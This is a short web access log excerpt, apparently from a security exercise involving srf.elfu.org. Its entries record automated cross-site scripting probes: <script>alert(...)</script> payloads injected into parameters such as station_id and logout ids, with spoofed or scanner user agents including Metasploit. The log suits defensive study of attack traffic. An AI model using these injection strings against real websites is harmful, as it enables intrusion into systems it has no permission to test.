123.127.233.97	<script>alert('automatedscanning');</script>&action=item	-	/index.html	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
95.166.116.45	<script>alert(\"automatedscanning\");</script>&from=add	-	/santa.html	Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19
80.244.147.207	<script>alert('automatedscanning');</script>&function=search	-	/home.html	Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30
168.66.108.62	<script>alert(\"automatedscanning\")</script><img src=\"	-	/home.html	Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36
200.75.228.240	<script>alert(\"avdscan-681165131\");d('	-	/alert.html	Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
56.5.47.137	srf.elfu.org	-	/logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\"><script>alert(1536286186)</script>	HttpBrowser/1.0
19.235.69.221	10.20.3.80	-	/api/weather?station_id=<script>alert(1)</script>.html	Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
69.221.145.150	-	-	/api/measurements?station_id=<script>alert(60602325)</script>	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)
42.191.112.181	-	-	/api/weather?station_id=<script>alert(autmatedsacnningist)</script>	Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)
48.66.193.176	srf.elfu.org	-	/api/weather?station_id=<script>alert(automatedscaning)</script>	Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)
49.161.8.58	srf.elfu.org	-	/api/stations?station_id=<script>alert('automatedscanning')</script>	Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N
84.147.231.129	10.20.3.80	-	/api/weather?station_id=<script>alert('automatedscanning');</script>	Mozilla/4.0 (compatible; Metasploit RSPEC)
44.74.106.131	srf.elfu.org	-	/api/stations?station_id=<script>alert(\"automatedscanning\")</script>	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13
106.93.213.219	10.20.3.80	-	/api/weather?station_id=<script>alert(\"automatedscanning\")</script>;	Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
